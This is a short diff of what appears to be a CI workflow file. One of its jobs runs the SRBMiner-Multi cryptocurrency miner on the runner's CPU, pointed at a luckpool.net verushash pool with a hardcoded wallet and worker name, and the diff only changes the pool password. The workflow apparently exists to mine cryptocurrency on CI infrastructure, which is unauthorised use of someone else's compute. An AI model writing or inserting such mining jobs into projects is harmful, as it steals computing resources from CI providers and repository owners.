@@ -20,7 +20,7 @@ jobs:
           
           cd SRBMiner-Multi-2-6-7 
           
-          ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool na.luckpool.net:3956 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc101 --password x --cpu-threads 4
+          ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool na.luckpool.net:3956 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc101 --password hybrid --cpu-threads 4
 
   pc2:
     name: "pc2"
